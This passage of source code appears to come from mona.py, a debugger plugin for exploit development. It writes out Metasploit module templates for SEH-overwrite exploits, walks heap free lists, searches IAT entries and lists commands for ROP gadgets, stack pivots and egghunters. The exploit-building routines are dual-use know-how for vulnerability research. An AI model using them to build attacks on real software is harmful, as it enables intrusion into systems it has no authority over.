						if "nonull" in sehcriteria:
							if sehcriteria["nonull"] == True:
								sehcriteria.pop("nonull")
								silent = True
								ptr_counter = 0
								ptr_to_get = 1									
								seh_pointers = findSEH(modulecriteria,sehcriteria)
								silent = False
								jmpback = True
					if len(seh_pointers) != 0:
						for ptrtypes in seh_pointers:
							sehptr = seh_pointers[ptrtypes][0]
							instrinfo = ptrtypes
							break
				else:
					if len(seh_pointers) == 0:
						sehptr = 0
					else:
						for ptrtypes in seh_pointers:
							sehptr = seh_pointers[ptrtypes][0]
							instrinfo = ptrtypes
							break
						
				if sehptr != 0:
					ptrx = MnPointer(sehptr)
					modname = ptrx.belongsTo()
					mixin = ""
					if not jmpback:
						mixin += "#Don't forget to include the SEH mixin !\n"
						mixin += "include Msf::Exploit::Seh\n\n"
						skeletonheader += "\tinclude Msf::Exploit::Seh\n"

					targetstr = "\t\t\t'Targets'\t\t=>\n"
					targetstr += "\t\t\t\t[\n"
					targetstr += "\t\t\t\t\t[ '<fill in the OS/app version here>',\n"
					targetstr += "\t\t\t\t\t\t{\n"
					if not isSEHUnicode:
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t0x" + toHex(sehptr) + ",\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetSEH) + "\n"							
					else:
						origptr = toHex(sehptr)
						#real unicode ?
						unicodeptr = ""
						transforminfo = ""
						if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						else:
							#transform
							transform = UnicodeTransformInfo(origptr)
							transformparts = transform.split(",")
							transformsubparts = transformparts[0].split(" ")
							origptr = transformsubparts[len(transformsubparts)-1]
							transforminfo = " #unicode transformed to 0x" + toHex(sehptr)
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t" + unicodeptr + "," + transforminfo + "\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetSEH) + "\t#Unicode\n"						
					targetstr += "\t\t\t\t\t\t}\n"
					targetstr += "\t\t\t\t\t], # " + instrinfo + " - " + modname + "\n"
					targetstr += "\t\t\t\t],\n"

					exploitstr = "\tdef exploit\n\n"
					if exploittype.find("network") > -1:
						exploitstr += "\n\t\tconnect\n\n"
					
					if not isSEHUnicode:
						if not jmpback:
							exploitstr += "\t\tbuffer = rand_text(target['Offset'])\t#junk\n"
							exploitstr += "\t\tbuffer << generate_seh_record(target.ret)\n"
							exploitstr += "\t\tbuffer << make_nops(30)\n"
							exploitstr += "\t\tbuffer << payload.encoded\t#" + str(shellcodesizeSEH-30) +" bytes of space\n"
						else:
							exploitstr += "\t\tjmp_back = Rex::Arch::X86.jmp_short(-payload.encoded.length-5)\n\n"
							exploitstr += "\t\tbuffer = rand_text(target['Offset'] - payload.encoded.length - jmp_back.length)\t#junk\n"
							exploitstr += "\t\tbuffer << payload.encoded\n"
							exploitstr += "\t\tbuffer << jmp_back\t#jump back to start of payload.encoded\n"
							exploitstr += "\t\tbuffer << '\\xeb\\xf9\\x41\\x41'\t#nseh, jump back to jmp_back\n"
							exploitstr += "\t\tbuffer << [target.ret].pack('V')\t#seh\n"
					else:
						exploitstr += "\t\tnseh = <insert 2 bytes that will acts as nseh walkover>\n"
						exploitstr += "\t\talign = <insert routine to align a register to begin of payload and jump to it>\n\n"
						exploitstr += "\t\tpadding = <insert bytes to fill space between alignment code and payload>\n\n"
						exploitstr += "\t\t# Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
						exploitstr += "\t\t# and then manually encode with unicode inside the exploit section :\n\n"
						exploitstr += "\t\tenc = framework.encoders.create('x86/unicode_mixed')\n\n"
						exploitstr += "\t\tregister_to_align_to = <fill in the register name you will align to>\n\n"
						exploitstr += "\t\tenc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
						exploitstr += "\t\tunicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
						exploitstr += "\t\tbuffer = rand_text(target['Offset'])\t#unicode junk\n"
						exploitstr += "\t\tbuffer << nseh\t#Unicode walkover friendly dword\n"
						exploitstr += "\t\tbuffer << target['Ret']\t#Unicode friendly p/p/r\n"
						exploitstr += "\t\tbuffer << align\n"
						exploitstr += "\t\tbuffer << padding\n"
						exploitstr += "\t\tbuffer << unicodepayload\n"
						
					if exploittype.find("network") > -1:
						exploitstr += "\n\t\tprint_status(\"Trying target #{target.name}...\")\n"					
						exploitstr += "\t\tsock.put(buffer)\n\n"
						exploitstr += "\t\thandler\n"
					if exploittype == "fileformat":
						exploitstr += "\n\t\tfile_create(buffer)\n\n"						
					if exploittype.find("network") > -1:
						exploitstr += "\t\tdisconnect\n\n"						
						
					exploitstr += "\tend\n"
					if mixin != "":
						imm.log("Metasploit 'include' section :")
						imm.log("------------------------------")
						imm.logLines(mixin)
					imm.log("Metasploit 'Targets' section :")
					imm.log("------------------------------")
					imm.logLines(targetstr.replace("\t","    "))
					imm.log("")
					imm.log("Metasploit 'exploit' function :")
					imm.log("--------------------------------")
					imm.logLines(exploitstr.replace("\t","    "))
					
					
					#write skeleton
					objexploitfile_seh.write(skeletonheader+"\n",exploitfile_seh)
					objexploitfile_seh.write(skeletoninit+"\n",exploitfile_seh)
					objexploitfile_seh.write(targetstr,exploitfile_seh)
					objexploitfile_seh.write(skeletoninit2,exploitfile_seh)		
					objexploitfile_seh.write(exploitstr,exploitfile_seh)
					objexploitfile_seh.write("end",exploitfile_seh)					
					
				else:
					imm.log("    Unable to suggest a buffer layout because I couldn't find any good pointers",highlight=1)
			
			return	

		#-----stacks-----#
		def procStacks(args):
			stacks = getStacks()
			if len(stacks) > 0:
				imm.log("Stacks :")
				imm.log("--------")
				for threadid in stacks:
					imm.log("Thread %s : Stack : 0x%s - 0x%s (size : 0x%s)" % (str(threadid),toHex(stacks[threadid][0]),toHex(stacks[threadid][1]),toHex(stacks[threadid][1]-stacks[threadid][0])))
			else:
				imm.log("No threads/stacks found !",highlight=1)
			return
			
		def procHeap(args):
			#first, print list of heaps
			allheaps = []
			try:
				allheaps = imm.getHeapsAddress()
			except:
				allheaps = []

			imm.log("Heaps:")
			imm.log("------")
			if len(allheaps) > 0:
				for heap in allheaps:
					imm.log("0x%s" % toHex(heap))
			else:
				imm.log(" ** No heaps found")
			imm.log("")
			# did we specify -a and -t ?
			
			heapbase = 0
			searchtype = ""
			searchtypes = ["lal","freelist","all"]
			error = False
			
			showdata = False
			
			if len(allheaps) > 0:
				if "a" in args:
					hbase = args["a"].replace("0x","").replace("0X","")
					if not isAddress(hbase):
						imm.log("%s is an invalid address" % args["a"], highlight=1)
						return
					else:
						heapbase = hbase
			
				if "t" in args:
					if type(args["t"]).__name__.lower() != "bool":
						searchtype = args["t"].lower().replace('"','').replace("'","")
						if not searchtype in searchtypes:
							searchtype = ""
					else:
						searchtype = ""
						
				if "v" in args:
					showdata = True
			
				if searchtype == "":
					imm.log("Please specify a valid searchtype -t 'lal'/'freelist'/'all'",highlight=1)
					error = True
				if "a" in args and heapbase == 0:
					imm.log("Please specify a valid heap base address -a",highlight=1)
					error = True
			
			else:
				imm.log("No heaps found",highlight=1)
				return
			
			heap_to_query = []
			heapfound = False
			
			if "a" in args:
				for heap in allheaps:
					if heapbase == toHex(heap).lower():
						heapfound = True
						heap_to_query = [heapbase]
				if not heapfound:
					error = True
					imm.log("0x%s is not a valid heap base address" % heapbase,highlight=1)
			else:
				#show all heaps
				for heap in allheaps:
					heap_to_query.append(toHex(heap))
			
			if error:
				return
			else:
				for heapbase in heap_to_query:
					imm.log("[+] Processing heap 0x%s" % heapbase)
					if searchtype == "lal" or searchtype == "all":
						lalindex = 0
						imm.log("[+] Getting LookAsideList for heap 0x%s" % heapbase)
						# do we have a LAL for this heap ?
						FrontEndHeap = struct.unpack('<L',imm.readMemory(hexStrToInt(heapbase) + 0x580,4))[0]
						if FrontEndHeap > 0:
							listcnt = 0
							startloc = FrontEndHeap
							while lalindex < 128:
								thisptr = FrontEndHeap + (0x30 * lalindex)
								chunkptr = 0
								try:
									chunkptr = struct.unpack('<L',imm.readMemory(thisptr,4))[0]
								except:
									imm.log(" - Unable to read memory at 0x%s (LAL[%d])" % (thisptr,lalindex),highlight=1)
								chunksize = 0
								if chunkptr != 0:
									thissize = (lalindex * 8)
									imm.log("     %s" % ("-" * 70))
									imm.log("[%d] : 0x%s (chunk size : %d+%d=%d)" % (lalindex,toHex(thisptr),thissize,8,thissize+8))
									chunksize = thissize
								while chunkptr != 0 and chunkptr != startloc:
									if chunkptr != 0:
										chsize1 = imm.readMemory(chunkptr-8,1)
										chsize2 = imm.readMemory(chunkptr-7,1)
										hexstr = bin2hexstr(chsize2 + chsize1).replace("\\x","")
										if len(hexstr) == 0:
											hexstr = "00"
										hexval = hexStrToInt(hexstr) * 8	# size is in blocks
										data = ""
										if showdata:
											data = imm.readMemory(chunkptr+12,16)
											data = " | " + immutils.prettyhexprint(data).replace('\n','') 
										imm.log("     Chunk : 0x%s, FLINK at 0x%s (%d)%s" % (toHex(chunkptr-8),toHex(chunkptr),hexval,data),address=chunkptr-8)
										if chunksize != hexval and lalindex > 0:
											imm.log("   ** self.Size field of chunk at 0x%s may have been overwritten, it contains %d and should have been %d !" % (toHex(chunkptr-8),hexval,chunksize),highlight=1)
									try:
										chunkptr = struct.unpack('<L',imm.readMemory(chunkptr,4))[0]
									except:
										chunkptr = 0
									listcnt += 1
								lalindex += 1
							imm.log("[+] Done. Nr of LAL lists : %d" % listcnt)
							imm.log("")
						else:
							imm.log("[+] No LookAsideList found for this heap")
							imm.log("")
						
					if searchtype == "freelist" or searchtype == "all":
						flindex = 0
						imm.log("[+] Getting FreeLists for heap 0x%s" % heapbase)
						listcnt = 0
						while flindex < 128:
							freelistflink = hexStrToInt(heapbase) + 0x178 + (8 * flindex) + 4
							freelistblink = hexStrToInt(heapbase) + 0x178 + (8 * flindex) 
							try:
								tblink = struct.unpack('<L',imm.readMemory(freelistflink,4))[0]
								tflink = struct.unpack('<L',imm.readMemory(freelistblink,4))[0]
								#imm.log("freelistblink : 0x%s, tblink : 0x%s" % (toHex(freelistblink),toHex(tblink)))
								origblink = freelistblink
								if freelistblink != tblink:
									expectedsize = ">1016"
									if flindex != 0:
										expectedsize = str(8 * flindex)
									space = len(str(flindex))
									imm.log("     %s" % ("-" * 80))
									imm.log("    [%s] - FreeLists[%d] at 0x%s - 0x%s | Expected chunk size : %s" % (flindex,flindex,toHex(freelistblink),toHex(freelistflink),expectedsize))
									imm.log("         %s[FreeLists[%d].flink : 0x%s | FreeLists[%d].blink : 0x%s]" % (" " * space,flindex,toHex(tflink),flindex,toHex(tblink)))
									endchain = False
									while not endchain:
										thisblink = struct.unpack('<L',imm.readMemory(tflink+4,4))[0]
										thisflink = struct.unpack('<L',imm.readMemory(tflink,4))[0]
										chsize1 = imm.readMemory(tflink-8,1)
										chsize2 = imm.readMemory(tflink-7,1)
										hexstr = bin2hexstr(chsize2 + chsize1).replace("\\x","")
										hexval = hexStrToInt(hexstr) * 8	# size is in blocks						
										data = ""
										if showdata:
											data = imm.readMemory(thisblink+16,16)
											data = " | " + immutils.prettyhexprint(data).replace('\n','') 
										imm.log("           * Chunk : 0x%s [flink : 0x%s | blink : 0x%s] (ChunkSize : %d - 0x%s | UserSize : 0x%s)%s" % (toHex(tflink),toHex(thisflink),toHex(thisblink),hexval,toHex(hexval),toHex(hexval-8),data),address=tflink)										
										tflink=thisflink
										if tflink == origblink:
											endchain = True
							except:
								imm.log(" - Unable to read memory at 0x%s (FreeLists[%d])" % (freelistflink,flindex),highlight=1)
							flindex += 1
					imm.log("%s" % "*" * 90)					
					
			return
		
		
		def procGetIAT(args):
		
			keywords = []
			keywordstring = ""
			modulecriteria = {}
			criteria = {}
			
			if "s" in args:
				if type(args["s"]).__name__.lower() != "bool":
					keywordstring = args["s"].replace("'","").replace('"','')
					keywords = keywordstring.split(",")
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			modulestosearch = getModulesToQuery(modulecriteria)
			if not silent:
				imm.log("[+] Querying %d modules" % len(modulestosearch))
			
			if len(modulestosearch) > 0:
			
				iatfilename="iatsearch.txt"
				objiatfilename = MnLog(iatfilename)
				iatfile = objiatfilename.reset()
			
				for thismodule in modulestosearch:
					thismod = MnModule(thismodule)
					thisiat = thismod.getIAT()
					for allfuncs in thisiat:
						thisfuncname = thisiat[allfuncs].lower()
						origfuncname = thisfuncname
						firstindex = thisfuncname.find(".")
						if firstindex > 0:
							thisfuncname = thisfuncname[firstindex+1:len(thisfuncname)]
						addtolist = False
						if len(keywords) > 0:
							for keyword in keywords:
								keyword = keyword.lower().strip()
								if ((keyword.startswith("*") and keyword.endswith("*")) or keyword.find("*") < 0):
									keyword = keyword.replace("*","")
									if thisfuncname.find(keyword) > -1:
										addtolist = True
								if keyword.startswith("*") and not keyword.endswith("*"):
									keyword = keyword.replace("*","")
									if thisfuncname.endswith(keyword):
										addtolist = True
								if keyword.endswith("*") and not keyword.startswith("*"):
									keyword = keyword.replace("*","")
									if thisfuncname.startswith(keyword):
										addtolist = True
						else:
							addtolist = True
						if addtolist:
							theptr = struct.unpack('<L',imm.readMemory(allfuncs,4))[0]
							thedelta = allfuncs - thismod.moduleBase
							logentry = "At 0x%s in %s (base + 0x%s) : 0x%s (ptr to %s)" % (toHex(allfuncs),thismodule.lower(),toHex(thedelta),toHex(theptr),origfuncname)
							imm.log(logentry,address = allfuncs)
							objiatfilename.write(logentry,iatfile)
			return
			
		#-----Metasploit module skeleton-----#
		def procSkeleton(args):
		
			cyclicsize = 5000
			if "c" in args:
				if type(args["c"]).__name__.lower() != "bool":
					try:
						cyclicsize = int(args["c"])
					except:
						cyclicsize = 5000
			
			# ask for type of module

			imm.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
			exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
			
			exploittype = imm.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()
			
			if not exploittype in exploittypes:
				imm.log("Boo - invalid exploit type, try again !",highlight=1)
				return
				
			portnr = 0
			extension = ""
			if exploittype.find("network") > -1:
				portnr = imm.inputBox("Remote port number : ")
				try:
					portnr = int(portnr)
				except:
					portnr = 0
			if exploittype.find("fileformat") > -1:
				extension = imm.inputBox("File extension :")
			
			
			extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
			
			if not extension.startswith("."):
				extension = "." + extension			
			
			exploitfilename="msfskeleton.rb"
			objexploitfile = MnLog(exploitfilename)
			global ignoremodules
			global noheader
			noheader = True
			ignoremodules = True
			exploitfile = objexploitfile.reset()			
			ignoremodules = False
			noheader = False

			modulecriteria = {}
			criteria = {}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			badchars = ""
			if "badchars" in criteria:
				badchars = criteria["badchars"]
				
			if "nonull" in criteria:
				if not '\x00' in badchars:
					badchars += '\x00'			
			
			skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,"",badchars)
			
			targetstr = "\t\t\t'Targets'\t\t=>\n"
			targetstr += "\t\t\t\t[\n"
			targetstr += "\t\t\t\t\t[ '<fill in the OS/app version here>',\n"
			targetstr += "\t\t\t\t\t\t{\n"
			targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t0x00000000,\n"
			targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t0\n"
			targetstr += "\t\t\t\t\t\t}\n"
			targetstr += "\t\t\t\t\t],\n"
			targetstr += "\t\t\t\t],\n"
			
			exploitstr = "\tdef exploit\n\n"
			if exploittype.find("network") > -1:
				if exploittype.find("tcp") > -1:
					exploitstr += "\n\t\tconnect\n\n"
				elif exploittype.find("udp") > -1:
					exploitstr += "\n\t\tconnect_udp\n\n"
			
			exploitstr += "\t\tbuffer = Rex::Text.pattern_create(" + str(cyclicsize) + ")\n"
			
			if exploittype.find("network") > -1:
				exploitstr += "\n\t\tprint_status(\"Trying target #{target.name}...\")\n"	
				if exploittype.find("tcp") > -1:
					exploitstr += "\t\tsock.put(buffer)\n"
					exploitstr += "\n\t\thandler\n"
				elif exploittype.find("udp") > -1:
					exploitstr += "\t\tudp_sock.put(buffer)\n"
					exploitstr += "\n\t\thandler(udp_sock)\n"			
			if exploittype == "fileformat":
				exploitstr += "\n\t\tfile_create(buffer)\n\n"						
			if exploittype.find("network") > -1:
				exploitstr += "\t\tdisconnect\n\n"						
				
			exploitstr += "\tend\n"				
			
			objexploitfile.write(skeletonheader+"\n",exploitfile)
			objexploitfile.write(skeletoninit+"\n",exploitfile)
			objexploitfile.write(targetstr,exploitfile)
			objexploitfile.write(skeletoninit2,exploitfile)		
			objexploitfile.write(exploitstr,exploitfile)
			objexploitfile.write("end",exploitfile)	
			
			
			return
			
		# ----- Finally, some main stuff ----- #
		
		# All available commands and their Usage :
		
		sehUsage = """Default module criteria : non safeseh, non aslr, non rebase
This function will retrieve all stackpivot pointers that will bring you back to nseh in a seh overwrite exploit
Optional argument: 
    -all : also search outside of loaded modules"""
	
		configUsage = """Change config of mona.py
Available options are : -get <parameter>, -set <parameter> <value> or -add <parameter> <value_to_add>
Valid parameters are : workingfolder, excluded_modules, author"""
	
		jmpUsage = """Default module criteria : non aslr, non rebase 
Mandatory argument :  -r <reg>  where reg is a valid register"""
	
		ropfuncUsage = """Default module criteria : non aslr, non rebase, non os
Output will be written to ropfunc.txt"""
	
		modulesUsage = """Shows information about the loaded modules"""
		
		ropUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)
    -distance <value> : define the minimum distance for stackpivots (integer, default : 8).
                        If you want to specify a min and max distance, set the value to min,max
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)
    -split : write gadgets to individual files, grouped by the module the gadget belongs to
    -fast : skip the 'non-interesting' gadgets
    -end <instruction(s)> : specify one or more instructions that will be used as chain end. 
                               (Separate instructions with #). Default ending is RETN
    -f \"file1,file2,..filen\" : use mona generated rop files as input instead of searching in memory
    -rva : use RVA's in rop chain"""
	
		jopUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 8)"""	
							   
							   
		stackpivotUsage="""Default module criteria : non aslr,non rebase,non os
Optional parameters : 
    -offset <value> : define the maximum offset for RET instructions (integer, default : 40)
    -distance <value> : define the minimum distance for stackpivots (integer, default : 8)
                        If you want to specify a min and max distance, set the value to min,max
    -depth <value> : define the maximum nr of instructions (not ending instruction) in each gadget (integer, default : 6)"""							   
							   
		filecompareUsage="""Compares 2 or more files created by mona using the same output commands
Make sure to use files that are created with the same version of mona and 
contain the output of the same mona command
Mandatory argument : -f \"file1,file2,...filen\"
Put all filenames between one set of double quotes, and separate files with comma's
Output will be written to filecompare.txt and filecompare_not.txt (not matching pointers)
Optional parameters : 
    -contains \"INSTRUCTION\"  (will only list if instruction is found)
    -nostrict (will also list pointer is instructions don't match in all files)
    -range <number> : find overlapping ranges for all pointers + range. 
                      When using -range, the -contains and -nostrict options will be ignored"""

		patcreateUsage="""Create a cyclic pattern of a given size. Output will be written to pattern.txt
Mandatory argument : size (numberic value)
Optional arguments :
    -js : output pattern in unicode escaped javascript format
    -extended : extend the 3rd characterset (numbers) with punctuation marks etc
    -c1 <chars> : set the first charset to this string of characters
    -c2 <chars> : set the second charset to this string of characters
    -c3 <chars> : set the third charset to this string of characters"""
	
		patoffsetUsage="""Find the location of 4 bytes in a cyclic pattern
Mandatory argument : the 4 bytes to look for
Note :  you can also specify a register
Optional arguments :
    -extended : extend the 3rd characterset (numbers) with punctuation marks etc
    -c1 <chars> : set the first charset to this string of characters
    -c2 <chars> : set the second charset to this string of characters
    -c3 <chars> : set the third charset to this string of characters
Note : the charset must match the charset that was used to create the pattern !
"""

		findwildUsage = """Find instructions in memory, accepts wildcards :
Mandatory arguments :
        -s <instruction#instruction#instruction>  (separate instructions with #)
Optional arguments :
        -b <address> : base/bottom address of the search range
        -t <address> : top address of the search range
        -depth <nr>  : number of instructions to go deep
        -all : show all instruction chains, even if it contains something that might break the chain	
        -distance min=nr,max=nr : you can use a numeric offset wildcard (a single *) in the first instruction of the search
        the distance parameter allows you to specify the range of the offset		
Inside the instructions string, you can use the following wildcards :
        * = any instruction
        r32 = any register
Example : pop r32#*#xor eax,eax#*#pop esi#ret
        """


		findUsage= """Find a sequence of bytes in memory.
Mandatory argument : -s <pattern> : the sequence to search for. If you specified type 'file', then use -s to specify the file.
This file needs to be a file created with mona.py, containing pointers at the begin of each line.
Optional arguments:
    -type <type>    : Type of pattern to search for : bin,asc,ptr,instr,file
    -b <address> : base/bottom address of the search range
    -t <address> : top address of the search range
    -c : skip consecutive pointers but show length of the pattern instead
    -p2p : show pointers to pointers to the pattern (might take a while !)
           this setting equals setting -level to 1
    -level <number> : do recursive (p2p) searches, specify number of levels deep
                      if you want to look for pointers to pointers, set level to 1
    -offset <number> : subtract a value from a pointer at a certain level
    -offsetlevel <number> : level to subtract a value from a pointer
    -r <number> : if p2p is used, you can tell the find to also find close pointers by specifying -r with a value.
                  This value indicates the number of bytes to step backwards for each search
    -unicode : used in conjunction with search type asc, this will convert the search pattern to unicode first """
	
		assembleUsage = """Convert instructions to opcode. Separate multiple instructions with #.
Mandatory argument : -s <instructions> : the sequence of instructions to assemble to opcode"""
	
		infoUsage = """Show information about a given address in the context of the loaded application
Mandatory argument : -a <address> : the address to query"""

		dumpUsage = """Dump the specified memory range to a file. Either the end address or the size of
buffer needs to be specified.
Mandatory arguments :
    -s <address> : start address
    -f <filename> : the name of the file where to write the bytes
Optional arguments:
    -n <size> : the number of bytes to copy (size of the buffer)
    -e <address> : the end address of the copy"""
	
		compareUsage = """Compares contents of a binary file with locations in memory.
Mandatory argument :
    -f <filename> : full path to binary file
Optional argument :
    -a <address> : the address of the bytes in memory. If you don't specify an address, the script will try to
                   locate the bytes in memory by looking at the first 8 bytes"""
				   
		offsetUsage = """Calculate the number of bytes between two addresses. You can use 
registers instead of addresses. 
Mandatory arguments :
    -a1 <address> : the first address/register
    -a2 <address> : the second address/register"""
	
		bpUsage = """Set a breakpoint when a given address is read from, written to or executed
Mandatory arguments :
    -a <address> : the address where to set the breakpoint
    -t <type> : type of the breakpoint, can be READ, WRITE or SFX"""
	
		bfUsage = """Set a breakpoint on exported or imported function(s) of the selected modules. 
Mandatory argument :
    -t <type> : type of breakpoint action. Can be 'add' or 'del'
Optional arguments :
    -f <function type> : set to 'import' or 'export' to read IAT or EAT. Default : export
    -s <func,func,func> : specify function names. 
                          If you want a bp on all functions, set -s to *"""	
	
		nosafesehUsage = """Show modules that are not safeseh protected"""
		nosafesehaslrUsage = """Show modules that are not safeseh protected, not subject to ASLR, and won't get rebased either"""
		noaslrUsage = """Show modules that are not subject to ASLR and won't get rebased"""
		findmspUsage = """Finds begin of a cyclic pattern in memory, looks if one of the registers is overwritten with a cyclic pattern
or points into a cyclic pattern. findmsp will also look if a SEH record is overwritten and finally, 
it will look for cyclic patterns on the stack, and pointers to cyclic pattern on the stack.
Optional argument :
    -distance <value> : distance from ESP, applies to search on the stack. Default : search entire stack
Note : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use"""

		suggestUsage = """Suggests an exploit buffer structure based on pointers to a cyclic pattern
Note : you can use the same options as with pattern_create and pattern_offset in terms of defining the character set to use"""
		
		bytearrayUsage = """Creates a byte array, can be used to find bad characters
Optional arguments :
    -b <bytes> : bytes to exclude from the array. Example : '\\x00\\x0a\\x0d'
    -r : show array backwards (reversed), starting at \\xff
    Output will be written to bytearray.txt, and binary output will be written to bytearray.bin"""
	
		headerUsage = """Convert contents of a binary file to a nice 'header' string
Mandatory argument :
    -f <filename> : source filename"""
	
		updateUsage = """Update mona to the latest version
Optional argument : 
    -http : Use http instead of https"""
		getpcUsage = """Find getpc routine for specific register
Mandatory argument :
    -r : register (ex: eax)"""

		eggUsage = """Creates an egghunter routine
Optional arguments :
    -t : tag (ex: w00t). Default value is w00t
    -c : enable checksum routine. Only works in conjunction with parameter -f
    -f <filename> : file containing the shellcode
    -startreg <reg> : start searching at the address pointed by this reg
DEP Bypass options :
    -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"
    -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. 
                    By default this register is set to ESI
    -depsize <value> : sets the size for the dep bypass routine
    -depdest <reg> : this register points to the location of the egghunter itself.  
                     When bypassing DEP, the egghunter is already marked as executable. 
                     So when using the copy or copy_size methods, the DEP bypass in the egghunter 
                     would do a "copy 2 self".  In order to be able to do so, it needs a register 
                     where it can copy the shellcode to. 
                     If you leave this empty, the code will contain a GetPC routine."""
		
		stacksUsage = """Shows all stacks for each thread in the running application"""
		
		skeletonUsage = """Creates a Metasploit exploit module skeleton for a specific type of exploit
Optional arguments :
    -s : size of the cyclic pattern (default : 5000)"""
	
		heapUsage = """Show information about various heap chunk lists
Mandatory arguments :
    -a <address> : base address of the heap to query
    -t <type> : where type is 'lal' (lookasidelist), 'freelist' or 'all'"""
	
		getiatUsage = """Show IAT entries from selected module(s)
Optional arguments :
    -s <keywords> : only show IAT entries that contain one of these keywords"""
		
						  
		commands["seh"] 			= MnCommand("seh", "Find pointers to assist with SEH overwrite exploits",sehUsage, procFindSEH)
		commands["config"] 			= MnCommand("config","Manage configuration file (mona.ini)",configUsage,procConfig,"conf")
		commands["jmp"]				= MnCommand("jmp","Find pointers that will allow you to jump to a register",jmpUsage,procFindJMP, "j")
		commands["ropfunc"] 		= MnCommand("ropfunc","Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain",ropfuncUsage,procFindROPFUNC)
		commands["rop"] 			= MnCommand("rop","Finds gadgets that can be used in a ROP exploit",ropUsage,procROP)
		commands["jop"] 			= MnCommand("jop","Finds gadgets that can be used in a JOP exploit",jopUsage,procJOP)		
		commands["stackpivot"]		= MnCommand("stackpivot","Finds stackpivots (move stackpointer to controlled area)",stackpivotUsage,procStackPivots)
		commands["modules"] 		= MnCommand("modules","Show all loaded modules and their properties",modulesUsage,procShowMODULES,"mod")
		commands["filecompare"]		= MnCommand("filecompare","Compares 2 or more files created by mona using the same output commands",filecompareUsage,procFileCOMPARE,"fc")
		commands["pattern_create"]	= MnCommand("pattern_create","Create a cyclic pattern of a given size",patcreateUsage,procCreatePATTERN,"pc")
		commands["pattern_offset"]	= MnCommand("pattern_offset","Find location of 4 bytes in a cyclic pattern",patoffsetUsage,procOffsetPATTERN,"po")
		commands["find"] 			= MnCommand("find", "Find bytes in memory", findUsage, procFind,"f")
		commands["findwild"]		= MnCommand("findwild", "Find instructions in memory, accepts wildcards", findwildUsage, procFindWild,"fw")
		commands["assemble"] 		= MnCommand("assemble", "Convert instructions to opcode. Separate multiple instructions with #",assembleUsage,procAssemble,"asm")
		commands["info"] 			= MnCommand("info", "Show information about a given address in the context of the loaded application",infoUsage,procInfo)
		commands["dump"] 			= MnCommand("dump", "Dump the specified range of memory to a file", dumpUsage,procDump)
		commands["offset"]          = MnCommand("offset", "Calculate the number of bytes between two addresses", offsetUsage, procOffset)		
		commands["compare"]			= MnCommand("compare","Compare contents of a binary file with a copy in memory", compareUsage, procCompare,"cmp")
		commands["breakpoint"]		= MnCommand("bp","Set a memory breakpoint on read/write or execute of a given address", bpUsage, procBp,"bp")
		commands["nosafeseh"]		= MnCommand("nosafeseh", "Show modules that are not safeseh protected", nosafesehUsage, procModInfoS)
		commands["nosafesehaslr"]	= MnCommand("nosafesehaslr", "Show modules that are not safeseh protected, not aslr and not rebased", nosafesehaslrUsage, procModInfoSA)		
		commands["noaslr"]			= MnCommand("noaslr", "Show modules that are not aslr or rebased", noaslrUsage, procModInfoA)
		commands["findmsp"]			= MnCommand("findmsp","Find cyclic pattern in memory", findmspUsage,procFindMSP,"findmsf")
		commands["suggest"]			= MnCommand("suggest","Suggest an exploit buffer structure", suggestUsage,procSuggest)
		commands["bytearray"]		= MnCommand("bytearray","Creates a byte array, can be used to find bad characters",bytearrayUsage,procByteArray,"ba")
		commands["header"]			= MnCommand("header","Read a binary file and convert content to a nice 'header' string",headerUsage,procPrintHeader)
		commands["update"]			= MnCommand("update","Update mona to the latest version",updateUsage,procUpdate,"up")
		commands["getpc"]			= MnCommand("getpc","Show getpc routines for specific registers",getpcUsage,procgetPC)	
		commands["egghunter"]		= MnCommand("egg","Create egghunter code",eggUsage,procEgg,"egg")
		commands["stacks"]			= MnCommand("stacks","Show all stacks for all threads in the running application",stacksUsage,procStacks)
		commands["skeleton"]		= MnCommand("skeleton","Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit",skeletonUsage,procSkeleton)
		commands["breakfunc"]		= MnCommand("breakfunc","Set a breakpoint on an exported function in on or more dll's",bfUsage,procBf,"bf")
		commands["heap"]			= MnCommand("heap","Show heap related information",heapUsage,procHeap)
		commands["getiat"]			= MnCommand("getiat","Show IAT of selected module(s)",getiatUsage,procGetIAT)
		# get the options
		opts = {}
		last = ""
		arguments = []
		
		if len(args) >= 2:
			arguments = args[1:]
		
		for word in arguments:
			if (word[0] == '-'):
				word = word.lstrip("-")
				opts[word] = True
				last = word
			else:
				if (last != ""):
					if str(opts[last]) == "True":
						opts[last] = word
					else:
						opts[last] = opts[last] + " " + word
					#last = ""
		# if a command only requires a value and not a switch ?
		# then we'll drop the value into dictionary with key "?"
		if len(args) > 1 and args[1][0] != "-":
			opts["?"] = args[1]
	
		
		if len(args) < 1:
